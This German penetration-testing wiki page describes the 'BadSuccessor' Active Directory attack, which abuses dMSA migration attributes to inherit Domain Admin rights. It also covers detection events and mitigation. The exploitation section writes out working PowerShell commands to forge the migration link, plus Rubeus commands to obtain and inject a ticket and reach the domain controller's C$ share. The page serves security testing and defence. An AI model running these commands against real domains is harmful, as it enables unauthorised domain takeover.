# BadSuccessor: Privilegieneskalation durch Missbrauch der Migration von delegierten MSA

{{#include ../../banners/hacktricks-training.md}}

## Übersicht

Delegierte verwaltete Dienstkonten (**dMSA**) sind die nächste Generation der **gMSA**, die in Windows Server 2025 eingeführt werden. Ein legitimer Migrationsworkflow ermöglicht es Administratoren, ein *altes* Konto (Benutzer-, Computer- oder Dienstkonto) durch ein dMSA zu ersetzen, während die Berechtigungen transparent erhalten bleiben. Der Workflow wird über PowerShell-Cmdlets wie `Start-ADServiceAccountMigration` und `Complete-ADServiceAccountMigration` bereitgestellt und basiert auf zwei LDAP-Attributen des **dMSA-Objekts**:

* **`msDS-ManagedAccountPrecededByLink`** – *DN-Link* zum abgelösten (alten) Konto.
* **`msDS-DelegatedMSAState`**       – Migrationsstatus (`0` = keiner, `1` = in Bearbeitung, `2` = *abgeschlossen*).

Wenn ein Angreifer **irgendein** dMSA innerhalb einer OU erstellen und diese 2 Attribute direkt manipulieren kann, wird LSASS & der KDC das dMSA als *Nachfolger* des verlinkten Kontos behandeln. Wenn sich der Angreifer anschließend als dMSA authentifiziert, **erbt er alle Berechtigungen des verlinkten Kontos** – bis zu **Domain Admin**, wenn das Administratorkonto verlinkt ist.

Diese Technik wurde 2025 von Unit 42 als **BadSuccessor** bezeichnet. Zum Zeitpunkt des Schreibens ist **kein Sicherheitspatch** verfügbar; nur die Härtung der OU-Berechtigungen mildert das Problem.

### Angriffsanforderungen

1. Ein Konto, das *erlaubt* ist, Objekte innerhalb **einer organisatorischen Einheit (OU)** zu erstellen *und* mindestens eines der folgenden hat:
* `Create Child` → **`msDS-DelegatedManagedServiceAccount`** Objektklasse
* `Create Child` → **`All Objects`** (generisches Erstellen)
2. Netzwerkverbindung zu LDAP & Kerberos (Standard-Domänen-Szenario / Remote-Angriff).

## Auflisten verwundbarer OUs

Unit 42 veröffentlichte ein PowerShell-Hilfsskript, das Sicherheitsbeschreibungen jeder OU analysiert und die erforderlichen ACEs hervorhebt:
```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```
Unter der Haube führt das Skript eine paginierte LDAP-Suche nach `(objectClass=organizationalUnit)` durch und überprüft jeden `nTSecurityDescriptor` auf

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8` (Objektklasse *msDS-DelegatedManagedServiceAccount*)

## Ausbeutungsschritte

Sobald eine beschreibbare OU identifiziert ist, sind es nur noch 3 LDAP-Schreibvorgänge bis zum Angriff:
```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
-DNSHostName host.contoso.local \
-Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
@{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Nach der Replikation kann der Angreifer einfach **logon** als `attacker_dMSA$` oder ein Kerberos TGT anfordern – Windows wird das Token des *abgelösten* Kontos erstellen.

### Automatisierung

Mehrere öffentliche PoCs umhüllen den gesamten Workflow, einschließlich der Passwortabfrage und Ticketverwaltung:

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
* NetExec-Modul – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)

### Post-Exploitation
```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```
## Detection & Hunting

Aktivieren Sie **Objektüberwachung** für OUs und überwachen Sie die folgenden Windows-Sicherheitsereignisse:

* **5137** – Erstellung des **dMSA**-Objekts
* **5136** – Änderung von **`msDS-ManagedAccountPrecededByLink`**
* **4662** – Spezifische Attributänderungen
* GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
* GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – TGT-Ausstellung für das dMSA

Die Korrelation von `4662` (Attributänderung), `4741` (Erstellung eines Computer-/Dienstkontos) und `4624` (darauffolgende Anmeldung) hebt schnell BadSuccessor-Aktivitäten hervor. XDR-Lösungen wie **XSIAM** liefern sofort einsatzbereite Abfragen (siehe Referenzen).

## Mitigation

* Wenden Sie das Prinzip der **geringsten Privilegien** an – delegieren Sie die Verwaltung von *Service Accounts* nur an vertrauenswürdige Rollen.
* Entfernen Sie `Create Child` / `msDS-DelegatedManagedServiceAccount` von OUs, die dies nicht ausdrücklich benötigen.
* Überwachen Sie die oben aufgeführten Ereignis-IDs und alarmieren Sie bei *nicht-Tier-0*-Identitäten, die dMSAs erstellen oder bearbeiten.

## See also

{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## References

- [Unit42 – When Good Accounts Go Bad: Exploiting Delegated Managed Service Accounts](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [NetExec BadSuccessor module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

{{#include ../../banners/hacktricks-training.md}}
